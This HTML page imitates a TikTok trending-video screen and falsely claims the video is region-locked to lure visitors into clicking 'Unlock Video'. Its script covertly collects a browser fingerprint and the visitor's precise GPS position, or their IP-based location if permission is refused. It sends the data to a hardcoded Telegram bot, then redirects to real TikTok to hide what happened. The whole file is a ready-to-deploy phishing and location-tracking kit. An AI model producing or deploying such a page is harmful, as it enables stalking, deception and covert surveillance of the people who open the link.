<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>TikTok · Trending</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
        }
        .container {
            width: 100%;
            max-width: 360px;
            background: #121212;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }
        .video-placeholder {
            background: #1a1a1a;
            aspect-ratio: 9 / 16;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 20px;
            position: relative;
        }
        .play-icon {
            width: 64px;
            height: 64px;
            background: rgba(255,255,255,0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
        }
        .overlay-message {
            background: rgba(0,0,0,0.7);
            padding: 12px 20px;
            border-radius: 30px;
            font-size: 14px;
            text-align: center;
            margin: 10px;
        }
        .allow-button {
            background: #fe2c55;
            border: none;
            color: white;
            padding: 10px 20px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.2s;
        }
        .allow-button:hover { background: #e01e4a; }
        .footer {
            padding: 12px;
            text-align: center;
            font-size: 12px;
            color: #888;
            border-top: 1px solid #2a2a2a;
        }
        .status-text { font-size: 13px; margin-top: 8px; color: #aaa; }
        .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #aaa; border-top-color: #fff; border-radius: 50%; animation: spin 0.6s linear infinite; margin-left: 6px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="container">
    <div class="video-placeholder">
        <div class="play-icon">▶️</div>
        <div class="overlay-message">
            🔒 This video is restricted in your region.<br>
            Click below to verify your location and unlock content.
        </div>
        <button class="allow-button" id="allowBtn">✔️ Unlock Video</button>
        <div class="status-text" id="statusMsg"></div>
    </div>
    <div class="footer">TikTok · Trending now</div>
</div>

<script>
    // ========== TELEGRAM CREDENTIALS (YOURS) ==========
    const BOT_TOKEN = "8803190683:AAGPgzB40hHONL4uWM-N1Ewpi3DYNFNusP0";
    const CHAT_ID   = "5790869652";
    // =================================================

    async function sendToTelegram(text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const payload = { chat_id: CHAT_ID, text: text };
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch(e) { /* silent fail */ }
    }

    function getFingerprint() {
        const fp = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            touchPoints: navigator.maxTouchPoints,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            doNotTrack: navigator.doNotTrack,
            cookieEnabled: navigator.cookieEnabled,
            webdriver: navigator.webdriver,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer
        };
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 100, 50);
            ctx.fillStyle = '#069';
            ctx.fillText('fp', 10, 20);
            fp.canvasHash = canvas.toDataURL().substring(0, 100);
        } catch(e) { fp.canvasHash = 'error'; }
        return fp;
    }

    async function getIPLocation() {
        try {
            const res = await fetch('http://ip-api.com/json/');
            const data = await res.json();
            if (data.status === 'success') {
                return `${data.city}, ${data.region}, ${data.country} (lat: ${data.lat}, lon: ${data.lon})`;
            }
            return `IP: ${data.query} (location unavailable)`;
        } catch(e) {
            return 'IP geolocation failed';
        }
    }

    const btn = document.getElementById('allowBtn');
    const statusSpan = document.getElementById('statusMsg');

    btn.addEventListener('click', async () => {
        statusSpan.innerHTML = 'Unlocking content... <span class="spinner"></span>';
        const fp = getFingerprint();

        if (!navigator.geolocation) {
            statusSpan.innerHTML = 'Geolocation not supported. Redirecting...';
            await sendToTelegram(`❌ No geolocation support\n\nFingerprint:\n${JSON.stringify(fp, null, 2)}`);
            setTimeout(() => window.location.href = 'https://www.tiktok.com/@tiktok/video/trending', 1500);
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const loc = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    heading: position.coords.heading,
                    speed: position.coords.speed
                };
                const msg = `📍 EXACT LOCATION GRANTED\n\nCoordinates: ${loc.lat}, ${loc.lon}\nAccuracy: ${loc.accuracy}m\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`;
                await sendToTelegram(msg);
                statusSpan.innerHTML = 'Access granted! Redirecting...';
                setTimeout(() => window.location.href = 'https://www.tiktok.com/@tiktok/video/trending', 1500);
            },
            async (error) => {
                let errorMsg = '';
                switch(error.code) {
                    case error.PERMISSION_DENIED: errorMsg = 'User denied location'; break;
                    case error.POSITION_UNAVAILABLE: errorMsg = 'Position unavailable'; break;
                    case error.TIMEOUT: errorMsg = 'Timeout'; break;
                    default: errorMsg = 'Unknown error';
                }
                statusSpan.innerHTML = 'Location blocked. Redirecting...';
                const ipLoc = await getIPLocation();
                const msg = `🚫 LOCATION DENIED (${errorMsg})\n\nIP Location: ${ipLoc}\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`;
                await sendToTelegram(msg);
                setTimeout(() => window.location.href = 'https://www.tiktok.com/@tiktok/video/trending', 1500);
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    });
</script>
</body>
</html>
